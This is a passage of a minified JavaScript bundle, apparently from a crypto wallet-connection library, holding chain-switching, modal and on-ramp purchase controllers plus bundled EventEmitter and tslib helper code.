0,Cn.loading=!1,Cn.tokenBalances=[]}},rn=ec(C1e),BN={currentTab:0,tokenBalance:[],smartAccountDeployed:!1,addressLabels:new Map,user:void 0,preferredAccountType:void 0},O3={caipNetwork:void 0,supportsAllNetworks:!0,smartAccountEnabledNetworks:[]},nt=ar({chains:D0e(),activeCaipAddress:void 0,activeChain:void 0,activeCaipNetwork:void 0,noAdapters:!1,universalAdapter:{connectionControllerClient:void 0},isSwitchingNamespace:!1}),Kre={state:nt,subscribe(t){return ji(nt,()=>{t(nt)})},subscribeKey(t,e){return Mi(nt,t,e)},subscribeAccountStateProp(t,e,n){const r=n||nt.activeChain;return r?Mi(nt.chains.get(r)?.accountState||{},t,e):()=>{}},subscribeChainProp(t,e,n){let r;return ji(nt.chains,()=>{const i=n||nt.activeChain;if(i){const s=nt.chains.get(i)?.[t];r!==s&&(r=s,e(s))}})},initialize(t,e,n){const{chainId:r,namespace:i}=Be.getActiveNetworkProps(),s=e?.find(f=>f.id.toString()===r?.toString()),a=t.find(f=>f?.namespace===i)||t?.[0],c=t.map(f=>f.namespace).filter(f=>f!==void 0),l=de.state.enableEmbedded?new Set([...c]):new Set([...e?.map(f=>f.chainNamespace)??[]]);(t?.length===0||!a)&&(nt.noAdapters=!0),nt.noAdapters||(nt.activeChain=a?.namespace,nt.activeCaipNetwork=s,Y.setChainNetworkData(a?.namespace,{caipNetwork:s}),nt.activeChain&&ku.set({activeChain:a?.namespace})),l.forEach(f=>{const h=e?.filter(w=>w.chainNamespace===f),m=Be.getPreferredAccountTypes()||{},b={...de.state.defaultAccountTypes,...m};Y.state.chains.set(f,{namespace:f,networkState:ar({...O3,caipNetwork:h?.[0]}),accountState:ar({...BN,preferredAccountType:b[f]}),caipNetworks:h??[],...n}),Y.setRequestedCaipNetworks(h??[],f)})},removeAdapter(t){if(nt.activeChain===t){const e=Array.from(nt.chains.entries()).find(([n])=>n!==t);if(e){const n=e[1]?.caipNetworks?.[0];n&&Y.setActiveCaipNetwork(n)}}nt.chains.delete(t)},addAdapter(t,{connectionControllerClient:e},n){if(!t.namespace)throw new Error("ChainController:addAdapter - adapter must have a namespace");nt.chains.set(t.namespace,{namespace:t.namespace,networkState:{...O3,caipNetwork:n[0]},accountState:{...BN},caipNetworks:n,connectionControllerClient:e}),Y.setRequestedCaipNetworks(n?.filter(r=>r.chainNamespace===t.namespace)??[],t.namespace)},addNetwork(t){const e=nt.chains.get(t.chainNamespace);if(e){const n=[...e.caipNetworks||[]];e.caipNetworks?.find(r=>r.id===t.id)||n.push(t),nt.chains.set(t.chainNamespace,{...e,caipNetworks:n}),Y.setRequestedCaipNetworks(n,t.chainNamespace),Ce.filterByNamespace(t.chainNamespace,!0)}},removeNetwork(t,e){const n=nt.chains.get(t);if(n){const r=nt.activeCaipNetwork?.id===e,i=[...n.caipNetworks?.filter(s=>s.id!==e)||[]];r&&n?.caipNetworks?.[0]&&Y.setActiveCaipNetwork(n.caipNetworks[0]),nt.chains.set(t,{...n,caipNetworks:i}),Y.setRequestedCaipNetworks(i||[],t),i.length===0&&Ce.filterByNamespace(t,!1)}},setAdapterNetworkState(t,e){const n=nt.chains.get(t);n&&(n.networkState={...n.networkState||O3,...e},nt.chains.set(t,n))},setChainAccountData(t,e,n=!0){if(!t)throw new Error("Chain is required to update chain account data");const r=nt.chains.get(t);if(r){const i={...r.accountState||BN,...e};nt.chains.set(t,{...r,accountState:i}),(nt.chains.size===1||nt.activeChain===t)&&e.caipAddress&&(nt.activeCaipAddress=e.caipAddress)}},setChainNetworkData(t,e){if(!t)return;const n=nt.chains.get(t);if(n){const r={...n.networkState||O3,...e};nt.chains.set(t,{...n,networkState:r})}},setAccountProp(t,e,n,r=!0){Y.setChainAccountData(n,{[t]:e},r)},setActiveNamespace(t){nt.activeChain=t;const e=t?nt.chains.get(t):void 0,n=e?.networkState?.caipNetwork;n?.id&&t&&(nt.activeCaipAddress=e?.accountState?.caipAddress,nt.activeCaipNetwork=n,Y.setChainNetworkData(t,{caipNetwork:n}),Be.setActiveCaipNetworkId(n?.caipNetworkId),ku.set({activeChain:t,selectedNetworkId:n?.caipNetworkId}))},setActiveCaipNetwork(t){if(!t)return;const e=nt.activeChain===t.chainNamespace;e||Y.setIsSwitchingNamespace(!0);const n=nt.chains.get(t.chainNamespace);nt.activeChain=t.chainNamespace,nt.activeCaipNetwork=t,Y.setChainNetworkData(t.chainNamespace,{caipNetwork:t});let r=n?.accountState?.address;if(r)nt.activeCaipAddress=`${t.chainNamespace}:${t.id}:${r}`;else if(e&&nt.activeCaipAddress){const{address:s}=gi.parseCaipAddress(nt.activeCaipAddress);r=s,nt.activeCaipAddress=`${t.caipNetworkId}:${r}`}else nt.activeCaipAddress=void 0;Y.setChainAccountData(t.chainNamespace,{address:r,caipAddress:nt.activeCaipAddress}),rn.resetSend(),ku.set({activeChain:nt.activeChain,selectedNetworkId:nt.activeCaipNetwork?.caipNetworkId}),Be.setActiveCaipNetworkId(t.caipNetworkId),!Y.checkIfSupportedNetwork(t.chainNamespace)&&de.state.enableNetworkSwitch&&!de.state.allowUnsupportedChain&&!ke.state.wcBasic&&Y.showUnsupportedChainUI()},addCaipNetwork(t){if(!t)return;const e=nt.chains.get(t.chainNamespace);e&&e?.caipNetworks?.push(t)},async switchActiveNamespace(t){if(!t)return;const e=t!==Y.state.activeChain,n=Y.getNetworkData(t)?.caipNetwork,r=Y.getCaipNetworkByNamespace(t,n?.id);e&&r&&await Y.switchActiveNetwork(r)},async switchActiveNetwork(t,{throwOnFailure:e=!1}={}){const n=Y.state.activeChain;if(!n)throw new Error("ChainController:switchActiveNetwork - namespace is required");const r=Rn.getProviderId(nt.activeChain)==="AUTH",i=Y.getAccountData(n)?.address,s=ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.includes(t.chainNamespace);try{if(i&&t.chainNamespace===n||r&&s){const o=Gre.get(t.chainNamespace);if(!o)throw new Error("Adapter not found");await o.switchNetwork({caipNetwork:t})}Y.setActiveCaipNetwork(t)}catch(o){if(e)throw o}tt.sendEvent({type:"track",event:"SWITCH_NETWORK",properties:{network:t.caipNetworkId}})},getConnectionControllerClient(t){const e=t||nt.activeChain;if(!e)throw new Error("Chain is required to get connection controller client");const n=nt.chains.get(e);if(!n?.connectionControllerClient)throw new Error("ConnectionController client not set");return n.connectionControllerClient},getNetworkProp(t,e){const n=nt.chains.get(e)?.networkState;if(n)return n[t]},getRequestedCaipNetworks(t){const e=nt.chains.get(t),{approvedCaipNetworkIds:n=[],requestedCaipNetworks:r=[]}=e?.networkState||{};return xe.sortRequestedNetworks(n,r).filter(o=>o?.id)},getAllRequestedCaipNetworks(){const t=[];return nt.chains.forEach(e=>{if(!e.namespace)throw new Error("ChainController:getAllRequestedCaipNetworks - chainAdapter must have a namespace");const n=Y.getRequestedCaipNetworks(e.namespace);t.push(...n)}),t},setRequestedCaipNetworks(t,e){Y.setAdapterNetworkState(e,{requestedCaipNetworks:t});const r=Y.getAllRequestedCaipNetworks().map(s=>s.chainNamespace),i=Array.from(new Set(r));Ce.filterByNamespaces(i)},getAllApprovedCaipNetworkIds(){const t=[];return nt.chains.forEach(e=>{if(!e.namespace)throw new Error("ChainController:getAllApprovedCaipNetworkIds - chainAdapter must have a namespace");const n=Y.getApprovedCaipNetworkIds(e.namespace);t.push(...n)}),t},getActiveCaipNetwork(t){return t?nt.chains.get(t)?.networkState?.caipNetwork:nt.activeCaipNetwork},getActiveCaipAddress(){return nt.activeCaipAddress},getApprovedCaipNetworkIds(t){return nt.chains.get(t)?.networkState?.approvedCaipNetworkIds||[]},setApprovedCaipNetworksData(t,e){Y.setAdapterNetworkState(t,e)},checkIfSupportedNetwork(t,e){const n=e||nt.activeCaipNetwork?.caipNetworkId,r=Y.getRequestedCaipNetworks(t);return r.length?r?.some(i=>i.caipNetworkId===n):!0},checkIfSupportedChainId(t){return nt.activeChain?Y.getRequestedCaipNetworks(nt.activeChain)?.some(n=>n.id===t):!0},checkIfSmartAccountEnabled(){const t=bre.caipNetworkIdToNumber(nt.activeCaipNetwork?.caipNetworkId);return!nt.activeChain||!t?!1:!!($i.get(bt.SMART_ACCOUNT_ENABLED_NETWORKS)?.split(",")||[])?.includes(t.toString())},showUnsupportedChainUI(){kt.open({view:"UnsupportedChain"})},checkIfNamesSupported(){const t=nt.activeCaipNetwork;return!!(t?.chainNamespace&&jt.NAMES_SUPPORTED_CHAIN_NAMESPACES.includes(t.chainNamespace))},resetNetwork(t){Y.setAdapterNetworkState(t,{approvedCaipNetworkIds:void 0,supportsAllNetworks:!0})},resetAccount(t){const e=t;if(!e)throw new Error("Chain is required to set account prop");const n=Y.state.chains.get(e)?.accountState?.preferredAccountType,r=de.state.defaultAccountTypes[e];nt.activeCaipAddress=void 0,Y.setChainAccountData(e,{smartAccountDeployed:!1,currentTab:0,caipAddress:void 0,address:void 0,balance:void 0,balanceSymbol:void 0,profileName:void 0,profileImage:void 0,addressExplorerUrl:void 0,tokenBalance:[],connectedWalletInfo:void 0,preferredAccountType:r||n,socialProvider:void 0,socialWindow:void 0,farcasterUrl:void 0,user:void 0,status:"disconnected"}),Ce.removeConnectorId(e)},setIsSwitchingNamespace(t){nt.isSwitchingNamespace=t},getFirstCaipNetworkSupportsAuthConnector(){const t=[];let e;if(nt.chains.forEach(n=>{ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(r=>r===n.namespace)&&n.namespace&&t.push(n.namespace)}),t.length>0){const n=t[0];return e=n?nt.chains.get(n)?.caipNetworks?.[0]:void 0,e}},getAccountData(t){const e=t||nt.activeChain;if(e)return Y.state.chains.get(e)?.accountState},getNetworkData(t){const e=t||nt.activeChain;if(e)return Y.state.chains.get(e)?.networkState},getCaipNetworkByNamespace(t,e){if(!t)return;const n=Y.state.chains.get(t),r=n?.caipNetworks?.find(i=>i.id.toString()===e?.toString());return r||n?.networkState?.caipNetwork||n?.caipNetworks?.[0]},getRequestedCaipNetworkIds(){const t=Ce.state.filterByNamespace;return(t?[nt.chains.get(t)]:Array.from(nt.chains.values())).flatMap(n=>n?.caipNetworks||[]).map(n=>n.caipNetworkId)},getCaipNetworks(t){return t?Y.getRequestedCaipNetworks(t):Y.getAllRequestedCaipNetworks()},getCaipNetworkById(t,e){return Kre.getCaipNetworks(e).find(n=>n.id.toString()===t.toString()||n.caipNetworkId.toString()===t.toString())},setLastConnectedSIWECaipNetwork(t){nt.lastConnectedSIWECaipNetwork=t},getLastConnectedSIWECaipNetwork(){return nt.lastConnectedSIWECaipNetwork},async fetchTokenBalance(t){const e=Y.getAccountData();if(!e)return[];const n=Y.state.activeCaipNetwork?.caipNetworkId,r=Y.state.activeCaipNetwork?.chainNamespace,i=Y.state.activeCaipAddress,s=i?xe.getPlainAddress(i):void 0;if(Y.setAccountProp("balanceLoading",!0,r),e.lastRetry&&!xe.isAllowedRetry(e.lastRetry,30*jt.ONE_SEC_MS))return Y.setAccountProp("balanceLoading",!1,r),[];try{if(s&&n&&r){const o=await sB.getMyTokensWithBalance();return Y.setAccountProp("tokenBalance",o,r),Y.setAccountProp("lastRetry",void 0,r),Y.setAccountProp("balanceLoading",!1,r),o}}catch(o){Y.setAccountProp("lastRetry",Date.now(),r),t?.(o),on.showError("Token Balance Unavailable")}finally{Y.setAccountProp("balanceLoading",!1,r)}return[]},isCaipNetworkDisabled(t){const e=t.chainNamespace,n=!!Y.getAccountData(e)?.caipAddress,r=Y.getAllApprovedCaipNetworkIds(),i=Y.getNetworkProp("supportsAllNetworks",e)!==!1,s=Ce.getConnectorId(e),o=Ce.getAuthConnector(),a=s===ge.CONNECTOR_ID.AUTH&&o;return!n||i||a?!1:!r?.includes(t.caipNetworkId)}},Y=ec(Kre),Zre={onSwitchNetwork({network:t,ignoreSwitchConfirmation:e=!1}){const n=Y.state.activeCaipNetwork,r=Y.state.activeChain,i=we.state.data;if(t.id===n?.id)return;const o=!!Y.getAccountData(r)?.address,a=!!Y.getAccountData(t.chainNamespace)?.address,c=t.chainNamespace!==r,f=Ce.getConnectorId(r)===ge.CONNECTOR_ID.AUTH,h=ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(m=>m===t.chainNamespace);e||f&&h?we.push("SwitchNetwork",{...i,network:t}):o&&c&&!a?we.push("SwitchActiveChain",{switchToChain:t.chainNamespace,navigateTo:"Connect",navigateWithReplace:!0,network:t}):we.push("SwitchNetwork",{...i,network:t})}},Fo=ar({loading:!1,loadingNamespaceMap:new Map,open:!1,shake:!1,namespace:void 0}),S1e={state:Fo,subscribe(t){return ji(Fo,()=>t(Fo))},subscribeKey(t,e){return Mi(Fo,t,e)},async open(t){const e=t?.namespace,n=Y.state.activeChain,r=e&&e!==n,i=Y.getAccountData(t?.namespace)?.caipAddress,s=Y.state.noAdapters;if(ke.state.wcBasic?Ge.prefetch({fetchNetworkImages:!1,fetchConnectorImages:!1,fetchWalletRanks:!1}):await Ge.prefetch(),Ce.setFilterByNamespace(t?.namespace),kt.setLoading(!0,e),e&&r){const o=Y.getNetworkData(e)?.caipNetwork||Y.getRequestedCaipNetworks(e)[0];o&&(s?(await Y.switchActiveNetwork(o),we.push("ConnectingWalletConnectBasic")):Zre.onSwitchNetwork({network:o,ignoreSwitchConfirmation:!0}))}else de.state.manualWCControl||s&&!i?xe.isMobile()?we.reset("AllWallets"):we.reset("ConnectingWalletConnectBasic"):t?.view?we.reset(t.view,t.data):i?we.reset("Account"):we.reset("Connect");Fo.open=!0,ku.set({open:!0}),tt.sendEvent({type:"track",event:"MODAL_OPEN",properties:{connected:!!i}})},close(){const t=de.state.enableEmbedded,e=!!Y.state.activeCaipAddress;Fo.open&&tt.sendEvent({type:"track",event:"MODAL_CLOSE",properties:{connected:e}}),Fo.open=!1,we.reset("Connect"),kt.clearLoading(),t?e?we.replace("Account"):we.push("Connect"):ku.set({open:!1}),ke.resetUri()},setLoading(t,e){e&&Fo.loadingNamespaceMap.set(e,t),Fo.loading=t,ku.set({loading:t})},clearLoading(){Fo.loadingNamespaceMap.clear(),Fo.loading=!1,ku.set({loading:!1})},shake(){Fo.shake||(Fo.shake=!0,setTimeout(()=>{Fo.shake=!1},500))}},kt=ec(S1e),rE={id:"2b92315d-eab7-5bef-84fa-089a131333f5",name:"USD Coin",symbol:"USDC",networks:[{name:"ethereum-mainnet",display_name:"Ethereum",chain_id:"1",contract_address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},{name:"polygon-mainnet",display_name:"Polygon",chain_id:"137",contract_address:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"}]},Uk={id:"USD",payment_method_limits:[{id:"card",min:"10.00",max:"7500.00"},{id:"ach_bank_account",min:"10.00",max:"25000.00"}]},T1e={providers:_re,selectedProvider:null,error:null,purchaseCurrency:rE,paymentCurrency:Uk,purchaseCurrencies:[rE],paymentCurrencies:[],quotesLoading:!1},In=ar(T1e),x1e={state:In,subscribe(t){return ji(In,()=>t(In))},subscribeKey(t,e){return Mi(In,t,e)},setSelectedProvider(t){if(t&&t.name==="meld"){const e=Y.state.activeChain,n=e===ge.CHAIN.SOLANA?"SOL":"USDC",r=e?Y.state.chains.get(e)?.accountState?.address??"":"",i=new URL(t.url);i.searchParams.append("publicKey",fme),i.searchParams.append("destinationCurrencyCode",n),i.searchParams.append("walletAddress",r),i.searchParams.append("externalCustomerId",de.state.projectId),In.selectedProvider={...t,url:i.toString()}}else In.selectedProvider=t},setOnrampProviders(t){if(Array.isArray(t)&&t.every(e=>typeof e=="string")){const e=t,n=_re.filter(r=>e.includes(r.name));In.providers=n}else In.providers=[]},setPurchaseCurrency(t){In.purchaseCurrency=t},setPaymentCurrency(t){In.paymentCurrency=t},setPurchaseAmount(t){Lk.state.purchaseAmount=t},setPaymentAmount(t){Lk.state.paymentAmount=t},async getAvailableCurrencies(){const t=await Bt.getOnrampOptions();In.purchaseCurrencies=t.purchaseCurrencies,In.paymentCurrencies=t.paymentCurrencies,In.paymentCurrency=t.paymentCurrencies[0]||Uk,In.purchaseCurrency=t.purchaseCurrencies[0]||rE,await Ge.fetchCurrencyImages(t.paymentCurrencies.map(e=>e.id)),await Ge.fetchTokenImages(t.purchaseCurrencies.map(e=>e.symbol))},async getQuote(){In.quotesLoading=!0;try{const t=await Bt.getOnrampQuote({purchaseCurrency:In.purchaseCurrency,paymentCurrency:In.paymentCurrency,amount:In.paymentAmount?.toString()||"0",network:In.purchaseCurrency?.symbol});return In.quotesLoading=!1,In.purchaseAmount=Number(t?.purchaseAmount.amount),t}catch(t){return In.error=t.message,In.quotesLoading=!1,null}finally{In.quotesLoading=!1}},resetState(){In.selectedProvider=null,In.error=null,In.purchaseCurrency=rE,In.paymentCurrency=Uk,In.purchaseCurrencies=[rE],In.paymentCurrencies=[],In.paymentAmount=void 0,In.purchaseAmount=void 0,In.quotesLoading=!1}},Lk=ec(x1e);var k3={exports:{}},SH;function Yre(){if(SH)return k3.exports;SH=1;var t=typeof Reflect=="object"?Reflect:null,e=t&&typeof t.apply=="function"?t.apply:function(k,O,_){return Function.prototype.apply.call(k,O,_)},n;t&&typeof t.ownKeys=="function"?n=t.ownKeys:Object.getOwnPropertySymbols?n=function(k){return Object.getOwnPropertyNames(k).concat(Object.getOwnPropertySymbols(k))}:n=function(k){return Object.getOwnPropertyNames(k)};function r(v){console&&console.warn&&console.warn(v)}var i=Number.isNaN||function(k){return k!==k};function s(){s.init.call(this)}k3.exports=s,k3.exports.once=A,s.EventEmitter=s,s.prototype._events=void 0,s.prototype._eventsCount=0,s.prototype._maxListeners=void 0;var o=10;function a(v){if(typeof v!="function")throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof v)}Object.defineProperty(s,"defaultMaxListeners",{enumerable:!0,get:function(){return o},set:function(v){if(typeof v!="number"||v<0||i(v))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+v+".");o=v}}),s.init=function(){(this._events===void 0||this._events===Object.getPrototypeOf(this)._events)&&(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},s.prototype.setMaxListeners=function(k){if(typeof k!="number"||k<0||i(k))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+k+".");return this._maxListeners=k,this};function c(v){return v._maxListeners===void 0?s.defaultMaxListeners:v._maxListeners}s.prototype.getMaxListeners=function(){return c(this)},s.prototype.emit=function(k){for(var O=[],_=1;_<arguments.length;_++)O.push(arguments[_]);var I=k==="error",T=this._events;if(T!==void 0)I=I&&T.error===void 0;else if(!I)return!1;if(I){var B;if(O.length>0&&(B=O[0]),B instanceof Error)throw B;var U=new Error("Unhandled error."+(B?" ("+B.message+")":""));throw U.context=B,U}var M=T[k];if(M===void 0)return!1;if(typeof M=="function")e(M,this,O);else for(var N=M.length,q=w(M,N),_=0;_<N;++_)e(q[_],this,O);return!0};function l(v,k,O,_){var I,T,B;if(a(O),T=v._events,T===void 0?(T=v._events=Object.create(null),v._eventsCount=0):(T.newListener!==void 0&&(v.emit("newListener",k,O.listener?O.listener:O),T=v._events),B=T[k]),B===void 0)B=T[k]=O,++v._eventsCount;else if(typeof B=="function"?B=T[k]=_?[O,B]:[B,O]:_?B.unshift(O):B.push(O),I=c(v),I>0&&B.length>I&&!B.warned){B.warned=!0;var U=new Error("Possible EventEmitter memory leak detected. "+B.length+" "+String(k)+" listeners added. Use emitter.setMaxListeners() to increase limit");U.name="MaxListenersExceededWarning",U.emitter=v,U.type=k,U.count=B.length,r(U)}return v}s.prototype.addListener=function(k,O){return l(this,k,O,!1)},s.prototype.on=s.prototype.addListener,s.prototype.prependListener=function(k,O){return l(this,k,O,!0)};function f(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,arguments.length===0?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function h(v,k,O){var _={fired:!1,wrapFn:void 0,target:v,type:k,listener:O},I=f.bind(_);return I.listener=O,_.wrapFn=I,I}s.prototype.once=function(k,O){return a(O),this.on(k,h(this,k,O)),this},s.prototype.prependOnceListener=function(k,O){return a(O),this.prependListener(k,h(this,k,O)),this},s.prototype.removeListener=function(k,O){var _,I,T,B,U;if(a(O),I=this._events,I===void 0)return this;if(_=I[k],_===void 0)return this;if(_===O||_.listener===O)--this._eventsCount===0?this._events=Object.create(null):(delete I[k],I.removeListener&&this.emit("removeListener",k,_.listener||O));else if(typeof _!="function"){for(T=-1,B=_.length-1;B>=0;B--)if(_[B]===O||_[B].listener===O){U=_[B].listener,T=B;break}if(T<0)return this;T===0?_.shift():y(_,T),_.length===1&&(I[k]=_[0]),I.removeListener!==void 0&&this.emit("removeListener",k,U||O)}return this},s.prototype.off=s.prototype.removeListener,s.prototype.removeAllListeners=function(k){var O,_,I;if(_=this._events,_===void 0)return this;if(_.removeListener===void 0)return arguments.length===0?(this._events=Object.create(null),this._eventsCount=0):_[k]!==void 0&&(--this._eventsCount===0?this._events=Object.create(null):delete _[k]),this;if(arguments.length===0){var T=Object.keys(_),B;for(I=0;I<T.length;++I)B=T[I],B!=="removeListener"&&this.removeAllListeners(B);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if(O=_[k],typeof O=="function")this.removeListener(k,O);else if(O!==void 0)for(I=O.length-1;I>=0;I--)this.removeListener(k,O[I]);return this};function m(v,k,O){var _=v._events;if(_===void 0)return[];var I=_[k];return I===void 0?[]:typeof I=="function"?O?[I.listener||I]:[I]:O?E(I):w(I,I.length)}s.prototype.listeners=function(k){return m(this,k,!0)},s.prototype.rawListeners=function(k){return m(this,k,!1)},s.listenerCount=function(v,k){return typeof v.listenerCount=="function"?v.listenerCount(k):b.call(v,k)},s.prototype.listenerCount=b;function b(v){var k=this._events;if(k!==void 0){var O=k[v];if(typeof O=="function")return 1;if(O!==void 0)return O.length}return 0}s.prototype.eventNames=function(){return this._eventsCount>0?n(this._events):[]};function w(v,k){for(var O=new Array(k),_=0;_<k;++_)O[_]=v[_];return O}function y(v,k){for(;k+1<v.length;k++)v[k]=v[k+1];v.pop()}function E(v){for(var k=new Array(v.length),O=0;O<k.length;++O)k[O]=v[O].listener||v[O];return k}function A(v,k){return new Promise(function(O,_){function I(B){v.removeListener(k,T),_(B)}function T(){typeof v.removeListener=="function"&&v.removeListener("error",I),O([].slice.call(arguments))}S(v,k,T,{once:!0}),k!=="error"&&R(v,I,{once:!0})})}function R(v,k,O){typeof v.on=="function"&&S(v,"error",k,O)}function S(v,k,O,_){if(typeof v.on=="function")_.once?v.once(k,O):v.on(k,O);else if(typeof v.addEventListener=="function")v.addEventListener(k,function I(T){_.once&&v.removeEventListener(k,I),O(T)});else throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof v)}return k3.exports}var Wc=Yre();const oB=Vf(Wc);var jN={};var Fk=function(t,e){return Fk=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(n,r){n.__proto__=r}||function(n,r){for(var i in r)r.hasOwnProperty(i)&&(n[i]=r[i])},Fk(t,e)};function I1e(t,e){Fk(t,e);function n(){this.constructor=t}t.prototype=e===null?Object.create(e):(n.prototype=e.prototype,new n)}var $k=function(){return $k=Object.assign||function(e){for(var n,r=1,i=arguments.length;r<i;r++){n=arguments[r];for(var s in n)Object.prototype.hasOwnProperty.call(n,s)&&(e[s]=n[s])}return e},$k.apply(this,arguments)};function R1e(t,e){var n={};for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.indexOf(r)<0&&(n[r]=t[r]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(t);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(t,r[i])&&(n[r[i]]=t[r[i]]);return n}function P1e(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s}function N1e(t,e){return function(n,r){e(n,r,t)}}function O1e(t,e){if(typeof Reflect=="object"&&typeof Reflect.metadata=="function")return Reflect.metadata(t,e)}function k1e(t,e,n,r){function i(s){return s instanceof n?s:new n(function(o){o(s)})}return new(n||(n=Promise))(function(s,o){function a(f){try{l(r.next(f))}catch(h){o(h)}}function c(f){try{l(r.throw(f))}catch(h){o(h)}}function l(f){f.done?s(f.value):i(f.value).then(a,c)}l((r=r.apply(t,e||[])).next())})}function D1e(t,e){var n={label:0,sent:function(){if(s[0]&1)throw s[1];return s[1]},trys:[],ops:[]},r,i,s,o;return o={next:a(0),throw:a(1),return:a(2)},typeof Symbol=="function"&&(o[Symbol.iterator]=function(){return this}),o;function a(l){return function(f){return c([l,f])}}function c(l){if(r)throw new TypeError("Generator is already executing.");for(;n;)try{if(r=1,i&&(s=l[0]&2?i.return:l[0]?i.throw||((s=i.return)&&s.call(i),0):i.next)&&!(s=s.call(i,l[1])).done)return s;switch(i=0,s&&(l=[l[0]&2,s.value]),l[0]){case 0:case 1:s=l;break;case 4:return n.label++,{value:l[1],done:!1};case 5:n.label++,i=l[1],l=[0];continue;case 7:l=n.ops.pop(),n.trys.pop();continue;default:if(s=n.trys,!(s=s.length>0&&s[s.length-1])&&(l[0]===6||l[0]===2)){n=0;continue}if(l[0]===3&&(!s||l[1]>s[0]&&l[1]<s[3])){n.label=l[1];break}if(l[0]===6&&n.label<s[1]){n.label=s[1],s=l;break}if(s&&n.label<s[2]){n.label=s[2],n.ops.push(l);break}s[2]&&n.ops.pop(),n.trys.pop();continue}l=e.call(t,n)}catch(f){l=[6,f],i=0}finally{r=s=0}if(l[0]&5)throw l[1];return{value:l[0]?l[1]:void 0,done:!0}}}function B1e(t,e,n,r){r===void 0&&(r=n),t[r]=e[n]}function j1e(t,e){for(var n in t)n!=="default"&&!e.hasOwnProperty(n)&&(e[n]=t[n])}function Hk(t){var e=typeof Symbol=="function"&&Symbol.iterator,n=e&&t[e],r=0;if(n)return n.call(t);if(t&&typeof t.length=="number")return{next:function(){return t&&r>=t.length&&(t=void 0),{value:t&&t[r++],done:!t}}};throw new TypeError(e?"Object is not iterable.":"Symbol.iterator is not defined.")}function Qre(t,e){var n=typeof Symbol=="function"&&t[Symbol.iterator];if(!n)return t;var r=n.call(t),i,s=[],o;try{for(;(e===void 0||e-- >0)&&!(i=r.next()).done;)s.push(i.value)}catch(a){o={error:a}}finally{try{i&&!i.done&&(n=r.return)&&n.call(r)}finally{if(o)throw o.error}}return s}function M1e(){for(var t=[],e=0;e<arguments.length;e++)t=t.concat(Qre(arguments[e]));return t}function U1e(){for(var t=0,e=0,n=arguments.length;e<n;e++)t+=arguments[e].length;for(var r=Array(t),i=0,e=0;e<n;e++)for(var s=arguments[e],o=0,a=s.length;o<a;o++,i++)r[i]=s[o];return r}function i_(t){return this instanceof i_?(this.v=t,this):new i_(t)}function L1e(t,e,n){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var r=n.apply(t,e||[]),i,s=[];return i={},o("next"),o("throw"),o("return"),i[Symbol.asyncIterator]=function(){return this},i;function o(m){r[m]&&(i[m]=function(b){return new Promise(function(w,y){s.push([m,b,w,y])>1||a(m,b)})})}function a(m,b){try{c(r[m](b))}catch(w){h(s[0][3],w)}}function c(m){m.value instanceof i_?Promise.resolve(m.value.v).then(l,f):h(s[0][2],m)}function l(m){a("next",m)}function f(m){a("throw",m)}function h(m,b){m(b),s.shift(),s.length&&a(s[0][0],s[0][1])}}function F1e(t){var e,n;return e={},r("next"),r("throw",function(i){throw i}),r("return"),e[Symbol.iterator]=function(){return this},e;function r(i,s){e[i]=t[i]?function(o){return(n=!n)?{value:i_(t[i](o)),done:i==="return"}:s?s(o):o}:s}}function $1e(t){if(!Symbol.asyncIterator)throw new TypeError("Symbol.asyncIterator is not defined.");var e=t[Symbol.asyncIterator],n;return e?e.call(t):(t=typeof Hk=="function"?Hk(t):t[Symbol.iterator](),n={},r("next"),r("throw"),r("return"),n[Symbol.asyncIterator]=function(){return this},n);function r(s){n[s]=t[s]&&function(o){return new Promise(function(a,c){o=t[s](o),i(a,c,o.done,o.value)})}}function i(s,o,a,c){Promise.resolve(c).then(function(l){s({value:l,done:a})},o)}}function H1e(t,e){return Object.defineProperty?Object.defineProperty(t,"raw",{value:e}):t.raw=e,t}function z1e(t){if(t&&t.__esModule)return t;var e={};if(t!=null)for(var n in t)Object.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e}function q1e(t){return t&&t.__esModule?t:{default:t}}function V1e(t,e){if(!e.has(t))throw new TypeError("attempted to get private field on non-instance");return e.get(t)}function W1e(t,e,n){if(!e.has(t))throw new TypeError("attempted to set private field on non-instance");return e.set(t,n),n}const G1e=Object.freeze(Object.defineProperty({__proto__:null,get __assign(){return $k},__asyncDelegator:F1e,__asyncGenerator:L1e,__asyncValues:$1e,__await:i_,__awaiter:k1e,__classPrivateFieldGet:V1e,__classPrivateFieldSet:W1e,__createBinding:B1e,__decorate:P1e,__exportStar:j1e,__extends:I1e,__generator:D1e,__importDefault:q1e,__importStar:z1e,__makeTemplateObject:H1e,__metadata:O1e,__param:N1e,__read:Qre,__rest:R1e,__spread:M1e,__spreadArrays:U1e,__values:Hk},Symbol.toStringTag,{value:"Module"})),G_=gre(G1e);var MN={},wv={},TH;function K1e(){if(TH)return wv;TH=1,Object.defineProperty(wv,"__esModule",{value:!0}),wv.delay=void 0;function t(e){return new Promise(n=>{setTimeout(()=>{n(!0)},e)})}return wv.delay=t,wv}var W0={},UN={},G0={},xH;function Z1e(){return 